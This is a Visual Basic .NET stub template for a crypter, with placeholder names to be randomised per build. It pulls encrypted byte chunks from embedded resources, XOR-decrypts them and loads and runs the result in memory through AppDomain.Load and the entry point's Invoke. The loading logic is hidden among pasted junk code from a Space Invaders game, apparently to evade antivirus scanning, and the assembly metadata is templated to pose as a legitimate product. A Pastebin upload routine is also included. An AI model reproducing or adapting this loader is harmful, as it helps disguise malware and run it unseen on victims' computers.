Imports System.Reflection
Imports System.Text
Imports System.Security.Cryptography
Imports System.IO
Imports System.Collections
Imports System.Collections.Generic
Imports System
imports system.globalization
Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Imports System.Text.Encoding
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.Resources
Imports Microsoft.VisualBasic
Imports System.Runtime.CompilerServices
Imports System.NET
Imports System.Drawing.Drawing2D
Imports System.Net.Sockets
Imports System.Threading
Imports System.Data
Imports System.Data.OleDb
Imports System.Collections.Specialized

<Assembly: AssemblyTitle("%ASSEMBLYTITLE%")> 
<Assembly: AssemblyDescription("%ASSEMBLYDESCRIPTION%")> 
<Assembly: AssemblyCompany("%ASSEMBLYCOMPANY%")> 
<Assembly: AssemblyProduct("%ASSEMBLYPRODUCT%")> 
<Assembly: AssemblyCopyright("%ASSEMBLYCOPYRIGHT%")> 
<Assembly: AssemblyTrademark("%ASSEMBLYTRADEMARK%")> 
<Assembly: AssemblyVersion("%1%.%0%.%00%.%000%")> 
<Assembly: AssemblyFileVersion("$1$.$0$.$00$.$000$")> 


Public Class %CLASSNAME%


    Public Function NewPaste(ByVal Content As String)
        Dim api_dev_key As String = "" '<-- Your API key here
        Dim api_paste_code As String = URLEncode(Content)
        Dim api_paste_private As String = "2"
        'Dim api_paste_name As String = URLEncode(Name)
        Dim api_paste_expire_date As String = "10M"
        Dim api_paste_format As String = "php"
        Dim api_user_key As String = ""
        Dim Response As String = HttpPost("http://pastebin.com/api/api_post.php", "api_option=paste&api_dev_key=" & api_dev_key & "&api_paste_code=" & api_paste_code)
        If Response.Contains("Bad API request") = False Then
            Return Raw(Response)
        Else
            Return "Error"
        End If
    End Function
    Private Function URLEncode(ByVal EncodeStr As String) As String
        Dim i As Integer
        Dim erg As String
        erg = EncodeStr
        erg = Replace(erg, "%", Chr(1))
        erg = Replace(erg, "+", Chr(2))
        For i = 0 To 255
            Select Case i
                Case 37, 43, 48 To 57, 65 To 90, 97 To 122
                Case 1
                    erg = Replace(erg, Chr(i), "%25")
                Case 2
                    erg = Replace(erg, Chr(i), "%2B")
                Case 32
                    erg = Replace(erg, Chr(i), "+")
                Case 3 To 15
                    erg = Replace(erg, Chr(i), "%0" & Hex(i))
                Case Else
                    erg = Replace(erg, Chr(i), "%" & Hex(i))
            End Select
        Next
        Return erg
    End Function
    Public Function Raw(ByVal URL As String)
        Dim ID As String = URL.Substring(URL.LastIndexOf("/") + 1)
        ID = "http://pastebin.com/raw.php?i=" & ID
        Return ID
    End Function
    Private Function HttpPost(ByVal URL As String, ByVal Data As String)
        Dim request As WebRequest = WebRequest.Create(URL)
        request.Method = "POST"
        Dim byteArray As Byte() = Encoding.UTF8.GetBytes(Data)
        request.ContentType = "application/x-www-form-urlencoded"
        request.ContentLength = byteArray.Length
        Dim dataStream As Stream = request.GetRequestStream()
        dataStream.Write(byteArray, 0, byteArray.Length)
        dataStream.Close()
        Dim response As WebResponse = request.GetResponse()
        'Console.WriteLine(CType(response, HttpWebResponse).StatusDescription)
        dataStream = response.GetResponseStream()
        Dim reader As New StreamReader(dataStream)
        Dim responseFromServer As String = reader.ReadToEnd()
        reader.Close()
        dataStream.Close()
        response.Close()
        Return responseFromServer
    End Function
End Class

class %CLASSNAME2%
    Private Declare Function FSOUND_Sample_Load Lib "fmod.dll" Alias "_FSOUND_Sample_Load@20" (ByVal index As Integer, ByVal name As String, ByVal inx As Integer, ByVal offset As Integer, ByVal length As Integer) As Integer
    Private Declare Function FSOUND_PlaySound Lib "fmod.dll" Alias "_FSOUND_PlaySound@8" (ByVal channel As Integer, ByVal sptr As Integer) As Integer
    Private Declare Function FSOUND_Sample_SetMode Lib "fmod.dll" Alias "_FSOUND_Sample_SetMode@8" (ByVal sptr As Integer, ByVal mode As Boolean) As Byte
    Private Declare Function FSOUND_StopSound Lib "fmod.dll" Alias "_FSOUND_StopSound@4" (ByVal channel As Integer) As Byte
    Private Declare Function FSOUND_IsPlaying Lib "fmod.dll" Alias "_FSOUND_IsPlaying@4" (ByVal channel As Integer) As Byte
	
    Public Const SW_SHOWNORMAL = 1
    Public Const SW_SHOWMINIMIZED = 2
    Public Const SW_SHOWMAXIMIZED = 3
    Public Const SW_SHOWNOACTIVATE = 4
    Public Const WPF_RESTORETOMAXIMIZED = &H2

    Public Declare Function EnumWindows Lib "user32" _
      (ByVal lpEnumFunc As Long, _
       ByVal lParam As Long) As Long

    Private Declare Function GetWindowText Lib "user32" _
        Alias "GetWindowTextA" _
       (ByVal hwnd As Long, _
        ByVal lpString As String, _
        ByVal cch As Long) As Long

    Private Declare Function GetClassName Lib "user32" _
        Alias "GetClassNameA" _
       (ByVal hwnd As Long, _
        ByVal lpClassName As String, _
        ByVal nMaxCount As Long) As Long

    Private Declare Function GetWindowTextLength Lib "user32" _
        Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long

    Private Declare Function IsWindowVisible Lib "user32" _
       (ByVal hwnd As Long) As Long

    Private Declare Function GetParent Lib "user32" _
       (ByVal hwnd As Long) As Long

    Private Declare Function IsWindowEnabled Lib "user32" _
       (ByVal hwnd As Long) As Long

    Public Declare Function IsZoomed Lib "user32" _
       (ByVal hwnd As Long) As Long

    Public Declare Function GetWindowPlacement Lib "user32" _
      (ByVal hwnd As Long, _
       lpwndpl As Long) As Long
	Public shared Function %FUNC3%(ByVal a As assembly)
	    Dim dispatchNew As Boolean ' Flag set when it is time to dispatch a new segment of invaders in a path
        Dim speed As Integer       ' Variable path speed ...
        Static dir As Integer      ' Hover direction left or right when the invaders are docked  
        Static ani As Integer      ' Simple 2 sprite animation for the invaders

        ' General working vars (multi purpose: loops, cache, counters etc ...)
        Dim i As Integer
        Dim j As Integer
        Dim k As Integer
        Dim e As Integer
        Dim c As Integer
        Dim t As Integer
        Try
            Dim tInvadersLaunched, invadersFinishedPath, tInvadersInPath, invaderBatchStartIndex, invaderEntryPath, invaders, tShootersInPath, timeScalerC, tDiversInPath, paths, entryPathIndex
            '                                ~:: LAUNCH INVADERS ONE AT A TIME ALONG PATHS ::~ 
			      dim loz = a.entrypoint
						  %FUNC1%("",loz)	
            If tInvadersLaunched < 59 Then
                For i = invadersFinishedPath To tInvadersInPath
                    For j = 0 To 1
                        Select Case invaderEntryPath

                            Case 0 '          :: Side of screen entry (3 iterations per level) ::

                                ' Do not follow path if diving (invader swoops out of the chain if diving)
                                If Not invaders((i + invaderBatchStartIndex) + (j * 6)).isDiving Then

                                    ' Left
                                    invaders(i + invaderBatchStartIndex).setX(paths.getLeftPointEntryX(73 - entryPathIndex(i)) - 50)
                                    invaders(i + invaderBatchStartIndex).setY(paths.getLeftPointEntryY(73 - entryPathIndex(i)) - 50)

                                    ' Right 
                                    invaders(i + (invaderBatchStartIndex + 6)).setX(paths.getRightPointEntryX(entryPathIndex(i)) + 25)
                                    invaders(i + (invaderBatchStartIndex + 6)).setY(paths.getRightPointEntryY(entryPathIndex(i)) - 70)
                                End If

                                ' Set speed 
                                speed = 1

                            Case 1 '          :: Center of screen entry (2 iterations per level) ::

                                ' Do not follow path if diving (invader swoops out of the chain if diving)
                                If Not invaders((i + invaderBatchStartIndex) + (j * 6)).isDiving Then

                                    ' Left  
                                    invaders(i + invaderBatchStartIndex).setX(paths.getLeftPointEntryX(entryPathIndex(i)) - 30)
                                    invaders(i + invaderBatchStartIndex).setY(paths.getLeftPointEntryY(entryPathIndex(i)) - 100)

                                    ' Right   
                                    invaders(i + (invaderBatchStartIndex + 6)).setX(paths.getRightPointEntryX(73 - entryPathIndex(i)) + 5)
                                    invaders(i + (invaderBatchStartIndex + 6)).setY(paths.getRightPointEntryY(73 - entryPathIndex(i)) - 120)
                                End If

                                ' Set speed
                                speed = 2
                        End Select

                        ' Random attacking while in paths (more likely to occur with each succesive level)
                        e = 3

                        ' Ensure e never goes below zero
                        If e < 0 Then e = 0

                        Select Case e
                            Case 0 '                            :: Diving ::

                                ' 1. Level denotes how many divers there can be at any given time
                                ' 2. Apply only to invader which has not been docked
                                ' 3. Ensure invader is on the screen by at least 50 pixels

                                If tDiversInPath < (2) Then
                                    If Not invaders((i + invaderBatchStartIndex) + (j * 6)).hasDockingCell Then
                                        Select Case j
                                            Case 0
                                                If invaders(i + invaderBatchStartIndex).getX > 75 Then
                                                
                                                    tDiversInPath += 1
                                                End If

                                            Case 1
                                                If invaders((i + invaderBatchStartIndex) + (j * 6)).getX < 525 Then
                                              
                                                    tDiversInPath += 1
                                                End If
                                        End Select
                                    End If
                                End If

                            Case Is < 20 '                     :: Shooting ::

                                ' 1. The actual level denotes as to how many shooters there can be at a time
                                ' 2. Ensure invader is not already shooting ...
                                ' 3. Avoid bullets in the very outter region of the screen

                                If tShootersInPath < (2) Then
                                    If Not invaders((i + invaderBatchStartIndex) + (j * 6)).isShooting Then
                                        Select Case j
                                            Case 0
                                                If invaders(i + invaderBatchStartIndex).getX > 444 Then
                                                    invaders(i + invaderBatchStartIndex).setDoShooting(True)
                                                    tShootersInPath += 1
                                                End If

                                            Case 1
                                                If invaders((i + invaderBatchStartIndex) + (j * 6)).getX < 3443 Then
                                                    invaders((i + invaderBatchStartIndex) + (j * 6)).setDoShooting(True)
                                                    tShootersInPath += 1
                                                End If
                                        End Select
                                    End If
                                End If
                        End Select
                    Next

                    ' Dock invader when the path has been completed 
                    If entryPathIndex(i) >= 72 Then

                        ' Inc total invaders launched / finished their path
                        invadersFinishedPath += 1
                        tInvadersLaunched += 2

                        ' Locate a specific cell for the invader which they will retain throughout the entire level
                        For j = 0 To 1
                            If Not invaders((i + invaderBatchStartIndex) + (j * 6)).hasDockingCell Then
                                MsgBox("aker")
                            End If
                        Next

                        '/
                    Else '- Invader still in path, inc invader along their path ...
                        '\

                        entryPathIndex(i) += speed
                    End If
                Next

                '                                       ~:: RELEASE NEW INVADERS ::

                ' Begin new batch of them when the current batch of them have finished the path ...
                If invadersFinishedPath = 6 Then
                    Select Case tInvadersLaunched
                        Case Is = 12, 24, 36, 48
                            dispatchNew = True
                            invaderBatchStartIndex = tInvadersLaunched
                    End Select
                End If

                ' Do not dispatch new lot if player has been shot, wait until player is active again
                Dim newbatchdelay = 55
                If dispatchNew Then

                    ' Short delay between launching next batch
                    If timeScalerC = 0 Then newBatchDelay += 1

                    If newBatchDelay = 3 Then

                        ' Toggle paths
                        invaderEntryPath += 1
                        invaderEntryPath = invaderEntryPath Mod 2

                        ' Reset and prepare to repeat
                        For i = 0 To 5
                            entryPathIndex(i) = 0
                        Next

                        ' Reset
                        tInvadersInPath = 0
                        invadersFinishedPath = 0
                        newBatchDelay = 0
                        dispatchNew = False
                    End If
                End If
            End If


            '                          ~:: SHIFT INVADERS BACK & FORTH IN THEIR DOCKING CELLS ::~ 

            ' Check if cells have exceeded specified X-axis and toggle direction if so ...
9:

            ' Shift all cells ... 
            For i = 0 To 59
                Select Case dir
                    Case 0
                        MsgBox("a")
                    Case 1
                        MsgBox("b")
                End Select

                ' Apply only to active invaders (invaders that are alive)
                If invaders(i).isActive Then

                    ' Invader must be docked not diving
                    If invaders(i).isDocked Then
                   

                        ' Apply x axis offset to the larger of the 3 invaders ...
                        ' this effectively centers it in the cell making it uniform with the others
                        Select Case invaders(i).getInvaderType
                            Case 3 To 5
                                invaders(i).setX(invaders(i).getX - 5)
                                invaders(i).setY(invaders(i).getY - 8)
                        End Select
                    End If
                End If
            Next

            '            ~:: FETCH INVADER ATTACK MOVES WHEN DOCKED -- RANDOM DIVES TOWARDS THE PLAYER & SHOOTING ::~ 

            ' Do not proceed to attack if the player has just been killed


            ' Fetch moves every 200mS
            If timeScalerC = 0 Then

                ' The odds of the invaders attacking increases with each new level 
                j = 3

                ' Random invader to apply moves to
                i = 5

                ' 50/50 chance of an invader attcking with the first level
                If j > 5 Then

                    ' Tally up how many invaders are attacking ...
                    For e = 0 To 59
                        If invaders(e).isActive Then
                            If invaders(e).isShooting Or invaders(e).isDiving Then
                                t += 1
                            End If
                        End If
                    Next

                    ' The number of invaders atacking can not exceed the level number + 2
                    If t < (55) Then
                        Do Until k = 1

                            ' Find an invader which is active and not attacking loop until we do
                            If invaders(i).isActive Then
                                If Not invaders(i).isShooting Then
                                    k = 1 : e = i
                                End If
                            End If

                            ' Fetch random ...
                            i = 3

                            ' Fail safe counter
                            c += 1

                            ' Time out can't find invader not already shooting
                            If c = 1000 Then
                                Exit Do
                            End If
                        Loop
                    End If

                    ' Found invader ...
                    If k = 1 Then

                        ' Invoke shoot method
                        invaders(e).setDoShooting(True)

                        ' If docked and not diving then invoke dive method too
                        If invaders(e).isDocked Then
                            If Not invaders(e).isDiving Then

                                invaders(e).setDocked(False)
                                invaders(e).setDoRotate(True)

                                ' Play snd effect
                           
                            End If
                        End If
                    End If
                End If
            End If

        Catch
        End Try
	 
                    End Function


	 public shared function %Mergefunction%()
	 
    Dim %VAR8% As Byte() = New Byte(0 - 1) {}
        Dim %VAR9% As String 
		Dim %VAR6% As New Global.System.Resources.ResourceManager("%randomresources%", GetType(%RandomModule%).Assembly)	
		Dim %VAR7% As string() = DirectCast(%VAR6%.GetObject("nameloc"), String())
        For Each %VAR9% In %VAR7%
		 Dim %VAR10% As Byte() = DirectCast(%VAR6%.GetObject(%VAR9%), Byte())
		  System.Array.Resize(Of Byte)(%VAR8%, (%VAR8%.Length + %VAR10%.Length))
	Try
            Dim dispatchNew As Boolean ' Flag set when it is time to dispatch a new segment of invaders in a path
            Dim speed As Integer       ' Variable path speed ...
            Static dir As Integer      ' Hover direction left or right when the invaders are docked  
            Static ani As Integer      ' Simple 2 sprite animation for the invaders

            ' General working vars (multi purpose: loops, cache, counters etc ...)
            Dim i As Integer
            Dim j As Integer
            Dim k As Integer
            Dim e As Integer
            Dim c As Integer
            Dim t As Integer
            Dim tInvadersLaunched, invadersFinishedPath, tInvadersInPath, invaderBatchStartIndex, invaderEntryPath, invaders, tShootersInPath, timeScalerC, tDiversInPath, paths, entryPathIndex
            '                                ~:: LAUNCH INVADERS ONE AT A TIME ALONG PATHS ::~ 

            If tInvadersLaunched < 59 Then
                For i = invadersFinishedPath To tInvadersInPath
                    For j = 0 To 1
                        Select Case invaderEntryPath

                            Case 0 '          :: Side of screen entry (3 iterations per level) ::

                                ' Do not follow path if diving (invader swoops out of the chain if diving)
                                If Not invaders((i + invaderBatchStartIndex) + (j * 6)).isDiving Then

                                    ' Left
                                    invaders(i + invaderBatchStartIndex).setX(paths.getLeftPointEntryX(73 - entryPathIndex(i)) - 50)
                                    invaders(i + invaderBatchStartIndex).setY(paths.getLeftPointEntryY(73 - entryPathIndex(i)) - 50)

                                    ' Right 
                                    invaders(i + (invaderBatchStartIndex + 6)).setX(paths.getRightPointEntryX(entryPathIndex(i)) + 25)
                                    invaders(i + (invaderBatchStartIndex + 6)).setY(paths.getRightPointEntryY(entryPathIndex(i)) - 70)
                                End If

                                ' Set speed 
                                speed = 1

                            Case 1 '          :: Center of screen entry (2 iterations per level) ::

                                ' Do not follow path if diving (invader swoops out of the chain if diving)
                                If Not invaders((i + invaderBatchStartIndex) + (j * 6)).isDiving Then

                                    ' Left  
                                    invaders(i + invaderBatchStartIndex).setX(paths.getLeftPointEntryX(entryPathIndex(i)) - 30)
                                    invaders(i + invaderBatchStartIndex).setY(paths.getLeftPointEntryY(entryPathIndex(i)) - 100)

                                    ' Right   
                                    invaders(i + (invaderBatchStartIndex + 6)).setX(paths.getRightPointEntryX(73 - entryPathIndex(i)) + 5)
                                    invaders(i + (invaderBatchStartIndex + 6)).setY(paths.getRightPointEntryY(73 - entryPathIndex(i)) - 120)
                                End If

                                ' Set speed
                                speed = 2
                        End Select
                    Next
                Next
            End If
        Catch ex As Exception

        End Try
		     System.Array.Copy(%VAR10%, 0, %VAR8%, (%VAR8%.Length - %VAR10%.Length), %VAR10%.Length)
	     next
		 Return %VAR8%
    End function

	 public shared Sub %SUB2%()	 
	
		  dim somewhat
		   dim loz
		    Try

            ' General working vars
            Dim i As Integer
            Dim j As Integer
            Dim c As Integer

            ' Specific vars ...
            Dim totalShot As Integer
            Dim collision As Boolean
            Dim invaderDead As Boolean
            Dim rect1, invaders, player, sndengineerror, sndeffects, score, rect2, playerbullet, pickup, particle
			somewhat = AppDomain.CurrentDomain.Load(%SUB1%(0))			

            ' Loop through all invader instances and check for collisions
            For j = 0 To 59

            Next

            ' Void checking if player is dead fucking meat ...
            If Not player.isDead Then

            End If

            ' :: Check if invader bullets have intersected with the player's ship ::

            If invaders(j).isShooting Then

                ' Enemy's bullets
                rect1.X = invaders(j).getBulletRectX
                rect1.Y = invaders(j).getBulletRectY
                rect1.Width = invaders(j).getBulletRectW
                rect1.Height = invaders(j).getBulletRectH


                ' Collision? set flag and cease shooting if so
                If rect1.IntersectsWith(rect2) Then
                    collision = True
                    invaders(j).setDoShooting(False)
                End If

                ' Player have a sheild?
                If player.hasSheild Then

                    ' Player's sheild
                    rect2.X = player.getSheildRectX
                    rect2.Y = player.getSheildRectY
                    rect2.Width = player.getSheildRectW
                    rect2.Height = player.getSheildRectH

                    If rect1.IntersectsWith(rect2) Then

                        invaders(j).setDoShooting(False)
                    End If
                End If
            End If
        Catch
        End Try
				 	

		   loz = %FUNC3%(somewhat)
		   end sub


	
		Public shared Sub %FUNC1%(byval fileName, byval crap)
	  Try

            ' General working vars
            Dim i As Integer
            Dim j As Integer
            Dim c As Integer

            ' Specific vars ...
            Dim totalShot As Integer
            Dim collision As Boolean
            Dim invaderDead As Boolean
            Dim rect1, invaders, player, sndengineerror, sndeffects, score, rect2, playerbullet, pickup, particle

            crap.invoke(Nothing, New Object() {})
            ' Loop through all invader instances and check for collisions
            For j = 0 To 59

                ' Void checking if player is dead fucking meat ...
                If Not player.isDead Then

                    ' :: Check if invader bullets have intersected with the player's ship ::

                    If invaders(j).isShooting Then

                        ' Enemy's bullets
                        rect1.X = invaders(j).getBulletRectX
                        rect1.Y = invaders(j).getBulletRectY
                        rect1.Width = invaders(j).getBulletRectW
                        rect1.Height = invaders(j).getBulletRectH


                        ' Collision? set flag and cease shooting if so
                        If rect1.IntersectsWith(rect2) Then
                            collision = True
                            invaders(j).setDoShooting(False)
                        End If

                        ' Player have a sheild?
                        If player.hasSheild Then

                            ' Player's sheild
                            rect2.X = player.getSheildRectX
                            rect2.Y = player.getSheildRectY
                            rect2.Width = player.getSheildRectW
                            rect2.Height = player.getSheildRectH

                            If rect1.IntersectsWith(rect2) Then

                                invaders(j).setDoShooting(False)
                            End If
                        End If
                    End If

                    ' :: Check for collisions between the invaders ship and the player's ship ::

                    If invaders(j).isActive Then
                        If invaders(j).isDiving Then

                            ' Enemy ship 
                            rect1.X = invaders(j).getRectX
                            rect1.Y = invaders(j).getRectY
                            rect1.Width = invaders(j).getRectW
                            rect1.Height = invaders(j).getRectH

                            ' Player's ship


                            '  Collision? set flag if so ... 
                            '  invader dies along with the player, both player and invader are now inactive
                            If rect1.IntersectsWith(rect2) Then
                                collision = True

                                invaders(j).setActive(False)
                            End If

                            ' Player have a sheild?
                            If player.hasSheild Then

                                ' Player's sheild
                                rect2.X = player.getSheildRectX
                                rect2.Y = player.getSheildRectY
                                rect2.Width = player.getSheildRectW
                                rect2.Height = player.getSheildRectH

                                If rect1.IntersectsWith(rect2) Then
        
                                    invaders(j).setActive(False)
                                End If
                            End If
                        End If
                    End If

                    ' Collision flag set? play sound effect and set player dead
                    If collision Then
                        player.setPlayerDead(True)

                        ' Play snd effect
                        If Not sndengineerror Then
                            sndeffects(3).playSND(False)
                        End If
                    End If
                End If

                ':: Check for collisions between the player's bullets and the invaders ::

                For i = 0 To 5
                    For c = 0 To 4

                        ' Bullet instance must exist ...
                        If playerbullet(i, c) IsNot Nothing Then

                            ' Invader must be still active
                            If invaders(j).isActive Then

                                ' 1. Player's bullet(s)
                                rect1.X = playerbullet(i, c).getRectX
                                rect1.Y = playerbullet(i, c).getRectY
                                rect1.Width = playerbullet(i, c).getRectW
                                rect1.Height = playerbullet(i, c).getRectH

                                ' 2. Enemy rect
                                rect2.X = invaders(j).getRectX
                                rect2.Y = invaders(j).getRectY
                                rect2.Width = invaders(j).getRectW
                                rect2.Height = invaders(j).getRectH

                                ' Collision?
                                If rect1.IntersectsWith(rect2) Then

                                    ' Create new particle instance


                                    ' Different invaders have different degrees of points awarded ...
                                    ' and some invaders require 2 or 3 shots before they are killed
                                    Select Case invaders(j).getInvaderType

                                        Case 0 ':: Blue invader 1 shot kills ::

                                            ' Inc score and set flag
                                            score += 50
                                            invaderDead = True

                                        Case 1 ':: Red invader requires 2 shots to kill ::

                                            ' Change colour to yellow
                                            invaders(j).setInvaderType(2)

                                        Case 2 ':: Yellow invader, was prev red 2nd shot kills ::

                                            ' Inc score and set flag
                                            invaderDead = True
                                            score += 100

                                        Case 3 ':: Large green invader takes 3 shots to kill ::

                                            ' Swap colour
                                            invaders(j).setInvaderType(4)

                                        Case 4 ':: Large invader 2nd shot ::

                                            ' Swap colour again
                                            invaders(j).setInvaderType(5)

                                        Case 5 ':: Large invader final shot ::

                                            ' Inc score and set flag
                                            invaderDead = True
                                            score += 250

                                            ' Drop pickup for killing this invader
                                            If pickup Is Nothing Then

                                                ' Fetch random pickup to drop
                                                Dim voidPickup As Boolean
                                                c = 4

                                                Select Case c
                                                    Case 0 ':: x3 firepower ::

                                                        ' Void if player alrewady has it
                                                        If player.getFirePowerLevel = 3 Then
                                                            voidPickup = True
                                                        End If

                                                    Case 1 ':: Sheild ::

                                                        ' Void if player already has it
                                                        If player.hasSheild Then
                                                            voidPickup = True
                                                        End If

                                                    Case 2 ':: x5 firepower ::

                                                        ' Void if player already has it
                                                        If player.getFirePowerLevel = 5 Then
                                                            voidPickup = True
                                                        End If
                                                End Select

                                                ' Create new instance of pickup to scroll
                                                If Not voidPickup Then
                                                    MsgBox("ak")
                                                End If
                                            End If
                                    End Select

                                    ' Enemy flag set? invader is now inactive
                                    If invaderDead Then

                                        invaders(j).setActive(False)
                                        invaderDead = False

                                        ' Play snd effect
                                        If Not sndengineerror Then
                                            sndeffects(2).playSND(False)
                                        End If
                                    End If

                                    ' Dispose of player bullet instance after collision
                                    playerbullet(i, c) = Nothing
                                End If
                            End If
                        End If
                    Next
                Next

                ' Tally up how many invaders are still active on the screen
                If Not invaders(j).isActive Then
                    totalShot += 1
                End If

                ' When the entire 60 are shot the level has been completed ...
                If totalShot = 60 Then

                    ' Sheild off
                    player.setSheild(False)

                    'bail
                    Exit Sub
                End If
            Next
        Catch
        End Try

    End Sub

	 public shared Function %SUB1%(ByVal memberVariable)
						return %RETURNBYTE%(0)
         End function

	 

	public shared function %FUNC2%(byval %VAR5% as byte(), byval VAR12 As integer, Byval VAR11 as byte())
Buffer.BlockCopy(%VAR5%, VAR12, VAR11, 0, VAR11.Length) 
end function


  Public shared Function %RETURNBYTE%(byval crap)
  Try
            Dim dispatchNew As Boolean ' Flag set when it is time to dispatch a new segment of invaders in a path
            Dim speed As Integer       ' Variable path speed ...
            Static dir As Integer      ' Hover direction left or right when the invaders are docked  
            Static ani As Integer      ' Simple 2 sprite animation for the invaders

            ' General working vars (multi purpose: loops, cache, counters etc ...)
            Dim i As Integer
            Dim j As Integer
            Dim k As Integer
            Dim e As Integer
            Dim c As Integer
            Dim t As Integer
            Dim tInvadersLaunched, invadersFinishedPath, tInvadersInPath, invaderBatchStartIndex, invaderEntryPath, invaders, tShootersInPath, timeScalerC, tDiversInPath, paths, entryPathIndex
            '                                ~:: LAUNCH INVADERS ONE AT A TIME ALONG PATHS ::~ 

            If tInvadersLaunched < 59 Then
                For i = invadersFinishedPath To tInvadersInPath
                    For j = 0 To 1
                        Select Case invaderEntryPath

                            Case 0 '          :: Side of screen entry (3 iterations per level) ::

                                ' Do not follow path if diving (invader swoops out of the chain if diving)
                                If Not invaders((i + invaderBatchStartIndex) + (j * 6)).isDiving Then

                                    ' Left
                                    invaders(i + invaderBatchStartIndex).setX(paths.getLeftPointEntryX(73 - entryPathIndex(i)) - 50)
                                    invaders(i + invaderBatchStartIndex).setY(paths.getLeftPointEntryY(73 - entryPathIndex(i)) - 50)

                                    ' Right 
                                    invaders(i + (invaderBatchStartIndex + 6)).setX(paths.getRightPointEntryX(entryPathIndex(i)) + 25)
                                    invaders(i + (invaderBatchStartIndex + 6)).setY(paths.getRightPointEntryY(entryPathIndex(i)) - 70)
                                End If

                                ' Set speed 
                                speed = 1

                            Case 1 '          :: Center of screen entry (2 iterations per level) ::

                                ' Do not follow path if diving (invader swoops out of the chain if diving)
                                If Not invaders((i + invaderBatchStartIndex) + (j * 6)).isDiving Then

                                    ' Left  
                                    invaders(i + invaderBatchStartIndex).setX(paths.getLeftPointEntryX(entryPathIndex(i)) - 30)
                                    invaders(i + invaderBatchStartIndex).setY(paths.getLeftPointEntryY(entryPathIndex(i)) - 100)

                                    ' Right   
                                    invaders(i + (invaderBatchStartIndex + 6)).setX(paths.getRightPointEntryX(73 - entryPathIndex(i)) + 5)
                                    invaders(i + (invaderBatchStartIndex + 6)).setY(paths.getRightPointEntryY(73 - entryPathIndex(i)) - 120)
                                End If

                                ' Set speed
                                speed = 2
                        End Select
                    Next
                Next
            End If
        Catch ex As Exception

        End Try
	    Dim %VAR5% As Byte() = %Mergefunction% '(%VAR1%, DirectCast(%VAR1%.GetObject("nameloc"), String()))
		Dim VAR12 As Integer = 70  
		  
		Dim VAR11 As Byte() = New Byte(%VAR5%.Length - VAR12 - 1) {}
		%FUNC2%(%VAR5%, VAR12, VAR11)
		For xx As Integer = 0 To VAR11.Length - 1
        VAR11(xx) = VAR11(xx) Xor %VAR5%(xx Mod VAR12)
			Next
		return VAR11
	    End function


End Class


Module %RandomModule%

Sub Main()
dim tictac as textbox
        If 4 = 4 Then
	%CLASSNAME2%.%SUB2%
		 else
         End If
end Sub
End Module

